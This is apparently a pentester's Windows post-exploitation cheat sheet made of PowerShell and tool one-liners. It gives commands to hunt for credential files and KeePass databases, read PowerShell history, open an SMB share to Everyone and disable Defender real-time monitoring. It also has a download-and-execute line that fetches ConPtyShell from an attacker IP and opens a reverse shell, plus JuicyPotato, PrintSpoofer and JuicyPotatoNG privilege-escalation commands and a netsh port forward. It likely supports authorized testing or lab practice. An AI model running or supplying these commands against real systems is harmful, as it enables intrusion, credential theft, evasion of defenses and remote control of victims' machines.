# PowerShell 
% Post-Exploitation search 

## PowerShell - search for specific file ending
#platform/windows #target/local #cat/OWN
```
Get-ChildItem -Path C:\<path> -Include *.<file_ending> -File -Force -Recurse -ErrorAction SilentlyContinue
```

## PowerShell - search all .txt & .ini files
#platform/windows #target/local #cat/OWN
```
Get-ChildItem -Path C:\Users\ -Include *.txt,*.ini -File -Force -Recurse -ErrorAction SilentlyContinue
```

## PowerShell - search ALL
#platform/windows #target/local #cat/OWN
```
Get-ChildItem -Path C:\ -Include *.pdf,*.xls,*.xlsx,*.doc,*.docx,*.zip,*.kdbx, -File -Force -Recurse -ErrorAction SilentlyContinue
```
## PowerShell - search ALL but exclude paths/filenames
#platform/windows #target/local #cat/OWN
```
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.config,*.ini,*.zip,*.kdbx,*.log -File -Force -Recurse -ErrorAction SilentlyContinue | Where-Object {
    $_.Name -ne "desktop.ini" -and $_.FullName -notmatch '\\Application Data\\' -and $_.FullName -notmatch '\\AppData\\' -and $_.FullName -notmatch '\\Local Settings\\'
}
```

## PowerShell - check PowerShell history
#platform/windows #target/local #cat/OWN
```
cat C:\Users\$env:username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```


## PowerShell - recursivly search for keyword in files
#platform/windows #target/local #cat/OWN
```
Get-ChildItem -Recurse -Force | Select-String -Pattern '<pattern>'
```

% SMB

## PowerShell - create SMB share
#platform/windows #target/local #cat/OWN
```
New-SmbShare -Name "Share" -Path "<path|C:\Users\Public>" -FullAccess "Everyone"
```
## PowerShell - list SMB shares
#platform/windows #target/local #cat/OWN
```
Get-SmbMapping
```

## PowerShell - remove a SMB share
#platform/windows #target/local #cat/OWN
```
Remove-SmbMapping -RemotePath "\\<ServerName>\share"
```



## PowerShell - get 
#platform/windows #target/local #cat/OWN
```
$env:PATH -split ';'
```

## PowerShell - download file via Invoke-WebRequest
```
iwr -uri http://<ip>:2337/<path>/<file> -Outfile <file>
```

## PowerShell - disable Microsoft Defender
```
Set-MpPreference -DisableRealtimeMonitoring $true
```

% ConPtyShell
## PowerShell - download and execute ConPtyShell
```
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile IEX(IWR http://<ip>:<port|2337>/Windows/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <ip> <port|6666>
```

## ConPtyShell - set terminal size to a half screen terminal
```
$width=211; $height=79; $Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size ($width, $height); $Host.UI.RawUI.WindowSize = New-Object -TypeName System.Management.Automation.Host.Size -ArgumentList ($width, $height)
```

## PowerShell - get current terminal size
```
$size = $host.ui.rawui.WindowSize
```

% Windows PrivEsc exploits

## JuicyPotato - escalate to SYSTEM via SetImpersonatePrivileges
```
.\JuicyPotato32.exe -l 1337 -p C:\inetpub\wwwroot\rev.exe -t * -c {F087771F-D74F-4C1A-BB8A-E16ACA9124EA}
```

## PrintSpoofer - escalate to SYSTEM via SetImpersonatePrivileges (Windows 10 and Server 2019)
```
.\PrintSpoofer64.exe -c powershell.exe
```

## JuicyPotatoNG - escalate to SYSTEM via SetImpersonatePrivileges (Windows 11 and Server 2022)
```
.\JuicyPotatoNG.exe -t * -p "C:\Users\public\conptyshell.exe" -a "192.168.45.211 7777"
```



## netsh - create port forward [ADMIN]
```
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
```

## PowerUp.ps1 - invoke all checks
```
Invoke-AllChecks
```